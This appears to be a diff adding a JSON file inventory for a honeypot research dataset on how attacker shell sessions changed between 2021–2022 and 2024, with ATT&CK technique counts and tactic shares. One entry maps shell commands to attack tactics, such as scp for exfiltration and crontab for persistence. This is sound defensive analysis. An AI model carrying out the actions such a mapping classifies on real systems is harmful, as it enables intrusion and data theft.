+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#_command_frequency.py": {
+   "files": 1,
+   "bytes": 3582,
+   "lines": 94,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/02_command_frequency.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/compare/compare_#_session_recluster.py": {
+   "files": 1,
+   "bytes": 3565,
+   "lines": 100,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/compare/compare_05_session_recluster.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/attack_ttp/paper_techniques.jsonl": {
+   "files": 1,
+   "bytes": 3559,
+   "lines": 27,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 27,
+   "parsed": 27,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/attack_ttp/paper_techniques.jsonl",
+   "note": "",
+   "techniques": {
+    "T1016": 1,
+    "T1033": 1,
+    "T1069": 1,
+    "T1082": 1,
+    "T1083": 1,
+    "T1087": 1,
+    "T1124": 1,
+    "T1424": 1,
+    "T1518": 1,
+    "T1614": 1,
+    "T1005": 1,
+    "T1071": 1,
+    "T1105": 1,
+    "T1003": 1,
+    "T1059": 1,
+    "T1053": 1,
+    "T1098": 1,
+    "T1547": 1,
+    "T1548": 1,
+    "T1027": 1,
+    "T1070": 1,
+    "T1222": 1,
+    "T1562": 1,
+    "T1564": 1,
+    "T1655": 1,
+    "T1489": 1,
+    "T1496": 1
+   },
+   "technique_mentions_per_file": "min 27, median 27, max 27",
+   "fields": {
+    "technique_id": {
+     "filled": 27,
+     "seen": 27,
+     "distinct": 27,
+     "with_attack_ids": 27,
+     "top": [
+      [
+       "T1016",
+       1
+      ],
+      [
+       "T1033",
+       1
+      ],
+      [
+       "T1069",
+       1
+      ],
+      [
+       "T1082",
+       1
+      ],
+      [
+       "T1083",
+       1
+      ],
+      [
+       "T1087",
+       1
+      ],
+      [
+       "T1124",
+       1
+      ],
+      [
+       "T1424",
+       1
+      ]
+     ]
+    },
+    "technique": {
+     "filled": 27,
+     "seen": 27,
+     "distinct": 27,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "System Network Configuration Discovery",
+       1
+      ],
+      [
+       "System Owner/User Discovery",
+       1
+      ],
+      [
+       "Permission Groups Discovery",
+       1
+      ],
+      [
+       "System Information Discovery",
+       1
+      ],
+      [
+       "File and Directory Discovery",
+       1
+      ],
+      [
+       "Account Discovery",
+       1
+      ],
+      [
+       "System Time Discovery",
+       1
+      ],
+      [
+       "Process Discovery",
+       1
+      ]
+     ]
+    },
+    "share_2021_2022": {
+     "filled": 27,
+     "seen": 27,
+     "distinct": 20,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "0.0",
+       5
+      ],
+      [
+       "4e-05",
+       3
+      ],
+      [
+       "5e-05",
+       2
+      ],
+      [
+       "0.00085",
+       1
+      ],
+      [
+       "0.18294",
+       1
+      ],
+      [
+       "0.08058",
+       1
+      ],
+      [
+       "0.11551",
+       1
+      ],
+      [
+       "0.05726",
+       1
+      ]
+     ]
+    },
+    "share_2024": {
+     "filled": 27,
+     "seen": 27,
+     "distinct": 26,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "0.00019",
+       2
+      ],
+      [
+       "0.01751",
+       1
+      ],
+      [
+       "0.01589",
+       1
+      ],
+      [
+       "0.00016",
+       1
+      ],
+      [
+       "0.06894",
+       1
+      ],
+      [
+       "0.04499",
+       1
+      ],
+      [
+       "0.04382",
+       1
+      ],
+      [
+       "2e-05",
+       1
+      ]
+     ]
+    },
+    "trend": {
+     "filled": 27,
+     "seen": 27,
+     "distinct": 2,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "up",
+       15
+      ],
+      [
+       "down",
+       12
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/README.md": {
+   "files": 1,
+   "bytes": 3416,
+   "lines": 54,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/README.md",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#_session_length.py": {
+   "files": 1,
+   "bytes": 2757,
+   "lines": 73,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/08_session_length.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/compare/compare_#_new_commands.py": {
+   "files": 1,
+   "bytes": 2679,
+   "lines": 97,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/compare/compare_01_new_commands.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#c_replace_downloads.py": {
+   "files": 1,
+   "bytes": 2665,
+   "lines": 71,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/06c_replace_downloads.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#c_replace_downloads.py": {
+   "files": 1,
+   "bytes": 2646,
+   "lines": 71,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/06c_replace_downloads.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#_extract_sessions.py": {
+   "files": 1,
+   "bytes": 2624,
+   "lines": 75,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/01_extract_sessions.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/primary_process.py": {
+   "files": 1,
+   "bytes": 2553,
+   "lines": 67,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/primary_process.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/common/primary_process.py": {
+   "files": 1,
+   "bytes": 2248,
+   "lines": 62,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/common/primary_process.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#_session_length.py": {
+   "files": 1,
+   "bytes": 2225,
+   "lines": 59,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/08_session_length.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/compare/compare_#_sessions.py": {
+   "files": 1,
+   "bytes": 2171,
+   "lines": 72,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/compare/compare_04_sessions.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#b_technique_frequency.py": {
+   "files": 1,
+   "bytes": 2068,
+   "lines": 60,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/07b_technique_frequency.py",
+   "note": "",
+   "techniques": {
+    "T1059": 1,
+    "T1082": 1,
+    "T1087": 1,
+    "T1531": 1,
+    "T1083": 1,
+    "T1005": 1,
+    "T1222": 1,
+    "T1053": 1,
+    "T1057": 1,
+    "T1070": 1,
+    "T1027": 1,
+    "T1105": 1,
+    "T1548": 1,
+    "T1016": 1,
+    "T1424": 1,
+    "T1037": 1,
+    "T1655": 1,
+    "T1489": 1,
+    "T1098": 1,
+    "T1124": 1,
+    "T1518": 1,
+    "T1120": 1
+   },
+   "technique_mentions_per_file": "min 22, median 22, max 22",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#b_technique_frequency.py": {
+   "files": 1,
+   "bytes": 2063,
+   "lines": 60,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/07b_technique_frequency.py",
+   "note": "",
+   "techniques": {
+    "T1059": 1,
+    "T1082": 1,
+    "T1087": 1,
+    "T1531": 1,
+    "T1083": 1,
+    "T1005": 1,
+    "T1222": 1,
+    "T1053": 1,
+    "T1057": 1,
+    "T1070": 1,
+    "T1027": 1,
+    "T1105": 1,
+    "T1548": 1,
+    "T1016": 1,
+    "T1424": 1,
+    "T1037": 1,
+    "T1655": 1,
+    "T1489": 1,
+    "T1098": 1,
+    "T1124": 1,
+    "T1518": 1,
+    "T1120": 1
+   },
+   "technique_mentions_per_file": "min 22, median 22, max 22",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/compare/compare_#_new_parameters.py": {
+   "files": 1,
+   "bytes": 2062,
+   "lines": 78,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/compare/compare_02_new_parameters.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#_command_frequency.py": {
+   "files": 1,
+   "bytes": 1952,
+   "lines": 60,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/02_command_frequency.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#_#_system_commands.py": {
+   "files": 1,
+   "bytes": 1921,
+   "lines": 32,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/03_2_system_commands.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/attack_ttp/derived_session_coverage_tactics.jsonl": {
+   "files": 1,
+   "bytes": 1834,
+   "lines": 19,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 19,
+   "parsed": 19,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/attack_ttp/derived_session_coverage_tactics.jsonl",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "period": {
+     "filled": 19,
+     "seen": 19,
+     "distinct": 2,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2024",
+       10
+      ],
+      [
+       "2021_2022",
+       9
+      ]
+     ]
+    },
+    "tactic": {
+     "filled": 19,
+     "seen": 19,
+     "distinct": 10,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "Execution",
+       2
+      ],
+      [
+       "Discovery",
+       2
+      ],
+      [
+       "Defense Evasion",
+       2
+      ],
+      [
+       "Collection",
+       2
+      ],
+      [
+       "Privilege Escalation",
+       2
+      ],
+      [
+       "Persistence",
+       2
+      ],
+      [
+       "Unmapped",
+       2
+      ],
+      [
+       "Command and Control",
+       2
+      ]
+     ]
+    },
+    "session_count": {
+     "filled": 19,
+     "seen": 19,
+     "distinct": 19,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "5240",
+       1
+      ],
+      [
+       "4306",
+       1
+      ],
+      [
+       "4001",
+       1
+      ],
+      [
+       "3972",
+       1
+      ],
+      [
+       "3340",
+       1
+      ],
+      [
+       "3243",
+       1
+      ],
+      [
+       "3219",
+       1
+      ],
+      [
+       "1112",
+       1
+      ]
+     ]
+    },
+    "session_share": {
+     "filled": 19,
+     "seen": 19,
+     "distinct": 19,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "0.976701",
+       1
+      ],
+      [
+       "0.80261",
+       1
+      ],
+      [
+       "0.74576",
+       1
+      ],
+      [
+       "0.740354",
+       1
+      ],
+      [
+       "0.622554",
+       1
+      ],
+      [
+       "0.604473",
+       1
+      ],
+      [
+       "0.6",
+       1
+      ],
+      [
+       "0.207269",
+       1
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/compare/compare_#_command_recluster.py": {
+   "files": 1,
+   "bytes": 1697,
+   "lines": 52,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/compare/compare_05_command_recluster.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/scripts/to_parquet.py": {
+   "files": 1,
+   "bytes": 1518,
+   "lines": 51,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/scripts/to_parquet.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/LICENSE": {
+   "files": 1,
+   "bytes": 1410,
+   "lines": 28,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/LICENSE",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/CITATION.cff": {
+   "files": 1,
+   "bytes": 1248,
+   "lines": 44,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/CITATION.cff",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/common/attack_mapping.py": {
+   "files": 1,
+   "bytes": 984,
+   "lines": 25,
+   "kind": "json",
+   "binary": 0,
+   "rows": 1,
+   "parsed": 1,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/common/attack_mapping.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "Discovery[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "list of 10",
+       1
+      ]
+     ]
+    },
+    "Execution[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "list of 38",
+       1
+      ]
+     ]
+    },
+    "Persistence[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "[\"crontab\", \"mkdir\"]",
+       1
+      ]
+     ]
+    },
+    "Privilege Escalation[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "[\"sudo\", \"su\", \"passwd\"]",
+       1
+      ]
+     ]
+    },
+    "Defense Evasion[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "[\"clear\"]",
+       1
+      ]
+     ]
+    },
+    "Lateral Movement[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "[\"scp\"]",
+       1
+      ]
+     ]
+    },
+    "Collection[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "list of 4",
+       1
+      ]
+     ]
+    },
+    "Exfiltration[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "[\"scp\"]",
+       1
+      ]
+     ]
+    },
+    "Impact[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "[\"kill\"]",
+       1
+      ]
+     ]
+    },
+    "Other[]": {
+     "filled": 1,
+     "seen": 1,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "list of 6",
+       1
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#a_dedup_sessions.py": {
+   "files": 1,
+   "bytes": 937,
+   "lines": 27,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/06a_dedup_sessions.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#a_dedup_sessions.py": {
+   "files": 1,
+   "bytes": 889,
+   "lines": 27,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/06a_dedup_sessions.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/attack_ttp/paper_tactics.jsonl": {
+   "files": 1,
+   "bytes": 831,
+   "lines": 9,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 9,
+   "parsed": 9,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/attack_ttp/paper_tactics.jsonl",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "tactic": {
+     "filled": 9,
+     "seen": 9,
+     "distinct": 9,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "Discovery",
+       1
+      ],
+      [
+       "Collection",
+       1
+      ],
+      [
+       "Command and Control",
+       1
+      ],
+      [
+       "Credential Access",
+       1
+      ],
+      [
+       "Defense Evasion",
+       1
+      ],
+      [
+       "Execution",
+       1
+      ],
+      [
+       "Impact",
+       1
+      ],
+      [
+       "Persistence",
+       1
+      ]
+     ]
+    },
+    "share_2021_2022": {
+     "filled": 9,
+     "seen": 9,
+     "distinct": 8,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "0.0002",
+       2
+      ],
+      [
+       "0.3313",
+       1
+      ],
+      [
+       "0.016",
+       1
+      ],
+      [
+       "0.0",
+       1
+      ],
+      [
+       "0.0758",
+       1
+      ],
+      [
+       "0.1801",
+       1
+      ],
+      [
+       "0.1975",
+       1
+      ],
+      [
+       "0.1988",
+       1
+      ]
+     ]
+    },
+    "share_2024": {
+     "filled": 9,
+     "seen": 9,
+     "distinct": 9,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "0.1805",
+       1
+      ],
+      [
+       "0.0021",
+       1
+      ],
+      [
+       "0.0179",
+       1
+      ],
+      [
+       "0.0001",
+       1
+      ],
+      [
+       "0.3877",
+       1
+      ],
+      [
+       "0.1488",
+       1
+      ],
+      [
+       "0.0007",
+       1
+      ],
+      [
+       "0.1311",
+       1
+      ]
+     ]
+    },
+    "trend": {
+     "filled": 9,
+     "seen": 9,
+     "distinct": 2,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "up",
+       5
+      ],
+      [
+       "down",
+       4
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/#,#/cowrie/cowrie-#-#/#.数据来源信息.txt": {
+   "files": 2,
+   "bytes": 611,
+   "lines": 7,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/2021,2022/cowrie/cowrie-20210406-20210611/0.数据来源信息.txt",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/.gitignore": {
+   "files": 1,
+   "bytes": 459,
+   "lines": 36,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/.gitignore",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/requirements.txt": {
+   "files": 1,
+   "bytes": 286,
+   "lines": 8,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/requirements.txt",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#_ip_analysis.py": {
+   "files": 1,
+   "bytes": 248,
+   "lines": 10,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/08_ip_analysis.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  }
+ }
+}
